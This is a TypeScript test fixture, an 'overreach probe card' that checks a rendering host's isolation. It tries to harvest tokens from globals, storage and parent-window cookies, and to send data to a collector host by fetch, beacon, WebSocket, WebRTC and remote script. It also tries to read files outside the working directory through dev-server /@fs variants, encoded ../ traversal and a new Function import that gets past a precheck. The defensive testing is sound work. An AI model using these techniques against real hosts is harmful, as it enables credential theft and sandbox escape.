/**
 * Probe manifest for overreach probe card (test fixture; defined in
 * `docs/plan/sound-online-render-task.md` section "Overreach probe card").
 *
 * **This is a defensive test fixture for acceptance checking our own isolation, not attack
 * code**: used only in test environments, never enters card library, does not ship with releases.
 * It is part of an ordinary user card, which in its own code *attempts* item by item to read things
 * it should not according to a **fixed manifest**, recording for each item "what was read /
 * rejected / what error was reported" into a result object, retrieved by probe
 * (`scripts/probes/hosted-render-isolation-probe.mjs`) for assertions.
 *
 *   - Read-only, report-only: does not delete, modify, or consume resources, does not bypass
 *     browser or system security mechanisms; each item is `try { read } catch { record error }`;
 *   - Probe beforehand places **test-only fake credentials** everywhere (placeholder strings like
 *     `PROBE-FAKE-…`); no real credentials, real projects, or real external addresses are involved:
 *     all addresses in manifest are given by probe via clip params, all on local loopback test
 *     ports (the "test-dedicated external address" is a collection station started by probe on
 *     loopback);
 *   - This frame waits for manifest to finish before emitting (using card's standard
 *     `beginFrameWork`, same as asset loading for Lottie cards, etc.), ensuring results are always
 *     printed;
 *   - How results return: printed in chunks via `console.log` (page logs from rendering Chrome go
 *     into worker process output, retrieved by probe).
 *     **Assertions do not check self-reports here**, but whether retrieved content contains fake
 *     credentials and whether collection station received anything.
 *
 * Two implementation notes (not to evade anything, but to pass standard checks when installing
 * cards): timing uses `AbortSignal.timeout` instead of timers; loading modules from addresses known
 * only at runtime calls `import()` via `new Function` (host's synchronous file precheck allows only
 * literal dynamic imports).
 */

type Ctx = {
  tag: string;
  /** Test ports on local loopback (provided by probe): name → address */
  loopback?: Record<string, string>;
  /** Collection station started by probe itself (treated as "external address") */
  collector?: string;
  /** Cloud provider metadata address (only verifies connection failure) */
  metadata?: string;
  /** File outside working directory containing fake credentials (absolute path) */
  outsideFiles?: string[];
  /** Items from other projects: project id, document id, asset hash */
  other?: { projectId?: string; docId?: string; assetHash?: string };
  /** An asset chunk from own project (control: this should be readable) */
  ownAssetHash?: string;
  /** Card file that exists only in other projects (repository-relative path) */
  foreignCardFiles?: string[];
};

type Entry = { ok: boolean; got?: string; err?: string };
type Report = { tag: string; href: string; items: Record<string, Entry> };

const CLIP = 600;
const clip = (v: unknown) => { let s = ""; try { s = typeof v === "string" ? v : JSON.stringify(v); } catch { s = String(v); } return (s ?? "").slice(0, CLIP); };
const failed = (e: unknown): Entry => ({ ok: false, err: `${(e as any)?.name ?? "Error"}: ${String((e as any)?.message ?? e).slice(0, 200)}` });

async function attempt(items: Record<string, Entry>, name: string, fn: () => unknown) {
  try { items[name] = { ok: true, got: clip(await fn()) }; } catch (e) { items[name] = failed(e); }
}

/** Fetches an address, returns "status code + body start"; connection failure, blocks, and unreadable cross-origin throw errors, recorded by `attempt` */
async function fetchText(url: string, init: RequestInit = {}) {
  const res = await fetch(url, { ...init, signal: AbortSignal.timeout(4000) });
  const body = res.type === "opaque" ? "(opaque)" : await res.text();
  return `${res.status} ${res.type} ${body.slice(0, CLIP)}`;
}

/** Page preset script replaces `WebSocket` with an offline stub (blocking dev server hot update); here we grab browser's original from a blank subframe to test (create only one, leave it after use) */
let nativeWs: typeof WebSocket | null | undefined;
function nativeWebSocket(): typeof WebSocket | null {
  if (nativeWs !== undefined) return nativeWs;
  try {
    const frame = document.createElement("iframe");
    frame.style.display = "none";
    document.body.appendChild(frame);
    nativeWs = (frame.contentWindow as any)?.WebSocket ?? null;
  } catch { nativeWs = null; }
  return nativeWs ?? null;
}

/** Have a hidden subframe navigate to an address (subframe navigation is also an egress); only checks if it loaded, cannot read content from other origins */
function frameLoad(url: string): Promise<string> {
  return new Promise((resolve) => {
    const frame = document.createElement("iframe");
    frame.style.display = "none";
    const stop = AbortSignal.timeout(2500);
    const finish = (how: string) => { try { frame.remove(); } catch { /* Detached */ } resolve(how); };
    frame.onload = () => { let seen = "(unreadable)"; try { seen = String(frame.contentDocument?.body?.innerText ?? "").slice(0, 200); } catch { /* Other origin */ } finish(`load ${seen}`); };
    frame.onerror = () => finish("error");
    stop.addEventListener("abort", () => finish("timeout"));
    frame.src = url;
    document.body.appendChild(frame);
  });
}

function wsOpen(url: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const Ctor = nativeWebSocket();
    if (!Ctor) return reject(new Error("WebSocket unavailable"));
    let ws: WebSocket;
    try { ws = new Ctor(url, ["promptcut.v1"]); } catch (e) { return reject(e); }
    const stop = AbortSignal.timeout(4000);
    stop.addEventListener("abort", () => { try { ws.close(); } catch { /* Closed */ } reject(new Error("timeout")); });
    ws.onopen = () => { try { ws.close(); } catch { /* Closed */ } resolve("open"); };
    ws.onerror = () => reject(new Error("error"));
    ws.onclose = (ev) => reject(new Error(`closed ${ev.code}`));
  });
}

/** Traverse two levels on global object, collect all strings (probe looks for strings shaped like fake credentials and tickets) */
function dumpGlobals(): string {
  const parts: string[] = [];
  const seen = new Set<unknown>();
  const skip = /^(window|self|top|parent|frames|globalThis|document|location|navigator|performance|localStorage|sessionStorage|indexedDB|caches|cookieStore)$/;
  const walk = (v: unknown, depth: number, at: string) => {
    if (parts.length > 4000) return;
    if (typeof v === "string") { if (v.length >= 8) parts.push(`${at}=${v.slice(0, 300)}`); return; }
    if (v === null || (typeof v !== "object" && typeof v !== "function") || depth > 2 || seen.has(v)) return;
    seen.add(v);
    if (typeof Node !== "undefined" && v instanceof Node) return;
    let keys: string[] = [];
    try { keys = Object.getOwnPropertyNames(v); } catch { return; }
    for (const k of keys.slice(0, 400)) {
      if (depth === 0 && skip.test(k)) continue;
      let child: unknown;
      try { child = (v as any)[k]; } catch { continue; }
      walk(child, depth + 1, `${at}.${k}`);
    }
  };
  walk(globalThis, 0, "g");
  return parts.join("\n");
}

async function listIndexedDb(): Promise<string> {
  const dbs = await indexedDB.databases();
  return JSON.stringify(dbs.map((d) => d.name));
}

/** Load a module via address known only at runtime (checks if dev server serves files outside working directory as modules) */
const importAt = new Function("u", "return import(u)") as (u: string) => Promise<any>;

export async function runOverreach(ctx: Ctx): Promise<Report> {
  const items: Record<string, Entry> = {};
  const t = (name: string, fn: () => unknown) => attempt(items, name, fn);

  // Categories run in parallel (sequential within a category): whole manifest finishes in a few
  // seconds without holding this frame too long
  const sections: (() => Promise<void>)[] = [];
  const section = (fn: () => Promise<void>) => { sections.push(fn); };

  /* ---------- 1. Whether credentials or tickets exist in global objects on the page */
  section(async () => {
  await t("globals.dump", () => dumpGlobals());
  await t("globals.pcKeys", () => Object.getOwnPropertyNames(globalThis).filter((k) => /^__pc|ticket|token|secret|broker/i.test(k)));
  await t("globals.env", () => JSON.stringify((import.meta as any).env ?? null));
  await t("globals.process", () => JSON.stringify((globalThis as any).process?.env ?? null));

  });

  /* ---------- 2. Local storage */
  section(async () => {
  await t("storage.localStorage", () => JSON.stringify(Object.entries({ ...localStorage })));
  await t("storage.sessionStorage", () => JSON.stringify(Object.entries({ ...sessionStorage })));
  await t("storage.cookie", () => document.cookie);
  await t("storage.indexedDB", () => listIndexedDb());
  await t("storage.caches", async () => JSON.stringify(await caches.keys()));

  });

  /* ---------- 3. Parent page and other same-origin windows */
  section(async () => {
  await t("window.isTop", () => String(window.parent === window && window.top === window));
  await t("window.opener", () => String(window.opener));
  await t("window.parent.document", () => (window.parent === window ? "(this is the top level)" : String(window.parent.document.title)));
  await t("window.parent.cookie", () => (window.parent === window ? "(this is the top level)" : String(window.parent.document.cookie)));
  await t("window.frames", () => String(window.frames.length));
  await t("window.referrer", () => document.referrer);
  await t("window.broadcast", () => new Promise((resolve) => {
    // If other same-origin windows speak on the same channel, it can be heard here; listen only, do not send
    const ch = new BroadcastChannel("promptcut");
    const heard: string[] = [];
    ch.onmessage = (ev) => heard.push(clip(ev.data));
    AbortSignal.timeout(500).addEventListener("abort", () => { ch.close(); resolve(JSON.stringify(heard)); });
  }));

  });

  /* ---------- 4. Local loopback addresses and worker process's own endpoints */
  section(async () => {
  const sameOrigin = [
    "/api/frames/queue", "/api/prerender/info", "/api/cards/sync/status", "/api/cards/list", "/api/projects/list", "/api/ai/config",
    "/api/media/list", "/api/media/local?hashes=" + "0".repeat(64), "/api/docservice/info", "/api/costs", "/api/skill/state",
    // Built-in endpoint of dev server: without file param, even if not blocked it only returns "missing
    // parameter", will not actually open editor
    "/__open-in-editor",
  ];
  await Promise.all(sameOrigin.map((p) => t(`self.GET ${p}`, () => fetchText(p))));
  // Endpoints for "view frame" (images produced only when forwarded from Cloud Agent via management
  // process): page requests on its own. Even if not blocked, it only returns "missing project" / "no
  // such record", will not render anything
  await t("self.POST /api/vision/snapshot", () => fetchText("/api/vision/snapshot", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }));
  await t("self.GET /api/ai/visual/v-000000.json", () => fetchText("/api/ai/visual/v-000000.json"));
  // Write method: send to a non-existent endpoint: even if not blocked, it is only 404, modifies nothing
  await t("self.POST /api/overreach-probe/no-such-endpoint", () => fetchText("/api/overreach-probe/no-such-endpoint", { method: "POST", headers: { "content-type": "application/json" }, body: "{}" }));
  await t("self.ws", () => wsOpen(`ws://${location.host}/`));
  });
  section(async () => {
    await Promise.all(Object.entries(ctx.loopback ?? {}).flatMap(([name, base]) => [
      t(`loopback.${name}.cors`, () => fetchText(base)),
      t(`loopback.${name}.no-cors`, () => fetchText(base, { mode: "no-cors" })),
      t(`loopback.${name}.ws`, () => wsOpen(base.replace(/^http/, "ws"))),
      // Root page may load full stage and subresources; navigation that only reads non-existent APIs still
      // tests cross-origin/page gates, without leaving application-level long-lived connections.
      t(`loopback.${name}.frame`, () => frameLoad(`${base}/api/overreach-probe/no-such-endpoint`)),
    ]));
  });
  section(async () => {
  // P1/P3 revoke egress guard: do not execute real cloud metadata requests, can no longer treat
  // no egress as permission guarantee.
  await t("metadata.not-applicable", () => "Not applicable: the card egress guard is not implemented in these three versions; the metadata address was not requested");

  });

  /* ---------- 5. Content and assets of other projects */
  section(async () => {
  const other = ctx.other ?? {};
  if (other.assetHash) {
    await t("other.asset.self-route", () => fetchText(`/api/asset/media/${other.assetHash}`));
    await t("other.asset.media-route", () => fetchText(`/@media/${other.assetHash}`));
    await t("other.asset.media-file", () => fetchText(`/api/media/file?hash=${other.assetHash}`));
  }
  if (other.docId) {
    await t("other.project.export", () => fetchText(`/api/export/project/${other.docId}`));
    await t("other.project.export-timeline", () => fetchText(`/api/export/timeline/${other.docId}`));
  }
  for (const rel of ctx.foreignCardFiles ?? []) {
    await t(`other.card ${rel}`, () => fetchText(`/${rel}`));
    await t(`other.card ${rel}?raw`, () => fetchText(`/${rel}?raw`));
  }
  if (ctx.ownAssetHash) await t("own.asset", () => fetchText(`/@media/${ctx.ownAssetHash}`));
  await t("other.overlayListing", () => fetchText("/src/cards/userOverlay.ts"));
  await t("other.loadedMarkers", () => JSON.stringify((globalThis as any).__pcOverreachLoaded ?? null));

  });

  /* ---------- 6. Test-dedicated external address (probe's collection station) */
  section(async () => {
  if (ctx.collector) {
    const c = ctx.collector;
    await t('collector.resource.image', async () => {const image=new Image();image.src=`${c}/collect.png?tag=${ctx.tag}`;await image.decode();return image.naturalWidth===4?'loaded':'invalid';});
    await t('collector.resource.font', async () => {const font=new FontFace('HostedPublicProbe',`url(${c}/public-font.ttf)`);document.fonts.add(await font.load());return font.status;});
    const stylesheet = async (url: string) => {const link=document.createElement('link');link.rel='stylesheet';link.href=url;const ready=new Promise<void>((resolve,reject)=>{link.onload=()=>resolve();link.onerror=()=>reject(new Error('Stylesheet failed to load'));});document.head.append(link);await ready;};
    await t('collector.resource.style', async () => {await stylesheet(`${c}/public-style.css`);return getComputedStyle(document.documentElement).getPropertyValue('--pc-public-style').trim();});
    await t('collector.resource.import', async () => {await stylesheet(`${c}/public-import.css`);return getComputedStyle(document.documentElement).getPropertyValue('--pc-public-import').trim();});
    await t('collector.resource.script', async () => {const script=document.createElement('script');script.src=`${c}/public-script.js`;const ready=new Promise<void>((resolve,reject)=>{script.onload=()=>resolve();script.onerror=()=>reject(new Error('Script failed to load'));});document.head.append(script);await ready;return String((globalThis as any).__pcPublicExternalScript);});
    await Promise.all([
      t("collector.fetch", () => fetchText(`${c}/collect?via=fetch&tag=${ctx.tag}`, { mode: "no-cors" })),
      t("collector.post", () => fetchText(`${c}/collect?via=post&tag=${ctx.tag}`, { method: "POST", mode: "no-cors", body: "overreach-probe" })),
      t("collector.beacon", () => String(navigator.sendBeacon(`${c}/collect?via=beacon&tag=${ctx.tag}`, "overreach-probe"))),
      t("collector.image", () => new Promise((resolve, reject) => {
        const img = new Image();
        img.onload = () => resolve("loaded");
        img.onerror = () => reject(new Error("error"));
        img.src = `${c}/collect.png?via=image&tag=${ctx.tag}`;
      })),
      t("collector.ws", () => wsOpen(`${c.replace(/^http/, "ws")}/collect?via=ws&tag=${ctx.tag}`)),
      t("collector.frame", () => frameLoad(`${c}/collect?via=frame&tag=${ctx.tag}`)),
      t("collector.prefetch", () => new Promise((resolve) => {
        const link = document.createElement("link");
        link.rel = "prefetch";
        link.href = `${c}/collect?via=prefetch&tag=${ctx.tag}`;
        link.onload = () => resolve("load");
        link.onerror = () => resolve("error");
        AbortSignal.timeout(1500).addEventListener("abort", () => resolve("timeout"));
        document.head.appendChild(link);
      })),
      t("collector.webrtc", () => new Promise((resolve, reject) => {
        // Send only one probe (STUN), no connection established; collection station counts UDP packets on
        // the same port
        const host = new URL(c);
        const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:${host.hostname}:${host.port}` }] });
        pc.createDataChannel("overreach-probe");
        const seen: string[] = [];
        pc.onicecandidate = (ev) => { if (ev.candidate) seen.push(ev.candidate.type ?? "?"); else { pc.close(); resolve(JSON.stringify(seen)); } };
        pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(reject);
        AbortSignal.timeout(3000).addEventListener("abort", () => { pc.close(); resolve(JSON.stringify(seen)); });
      })),
    ]);
  }

  });

  /* ---------- 7. Reading files outside working directory during Node-side processing (via various dev server file-fetching patterns) */
  for (const [i, file] of (ctx.outsideFiles ?? []).entries()) section(async () => {
    const abs = file.replace(/\\/g, "/");
    const fsUrl = `/@fs/${abs.replace(/^\//, "")}`;
    const variants: Record<string, string> = {
      plain: fsUrl, raw: `${fsUrl}?raw`, url: `${fsUrl}?url`, inline: `${fsUrl}?inline`, importRaw: `${fsUrl}?import&raw`,
      rawTrailing: `${fsUrl}?raw??`, importInline: `${fsUrl}?import&inline=1.wasm?init`,
      traversal: `/src/cards/user/${"../".repeat(12)}${abs.replace(/^[A-Za-z]:\//, "").replace(/^\//, "")}?raw`,
      encoded: `/src/cards/user/${"..%2f".repeat(12)}${abs.replace(/^[A-Za-z]:\//, "").replace(/^\//, "")}?raw`,
    };
    for (const [how, url] of Object.entries(variants)) await t(`outside[${i}].${how}`, () => fetchText(url));
    await t(`outside[${i}].import`, async () => clip((await importAt(`${fsUrl}?raw`)).default));
    await t(`outside[${i}].file-scheme`, () => fetchText(`file:///${abs.replace(/^\//, "")}`));
  });

  await Promise.all(sections.map((run) => run().catch(() => {})));
  // Records are sorted by name for easy comparison
  const sorted: Record<string, Entry> = {};
  for (const k of Object.keys(items).sort()) sorted[k] = items[k];
  return { tag: ctx.tag, href: location.origin, items: sorted };
}

/** Results printed in chunks to page logs: `OVERREACH-RESULT <tag> <chunk-index>/<total-chunks> <base64 fragment>` */
export function emitReport(report: Report) {
  const bytes = new TextEncoder().encode(JSON.stringify(report));
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  const b64 = btoa(bin);
  const SIZE = 1200;
  const total = Math.ceil(b64.length / SIZE) || 1;
  const run = Math.random().toString(36).slice(2, 10);
  for (let i = 0; i < total; i += 1) console.log(`OVERREACH-RESULT ${report.tag} ${run} ${i + 1}/${total} ${b64.slice(i * SIZE, (i + 1) * SIZE)}`);
}
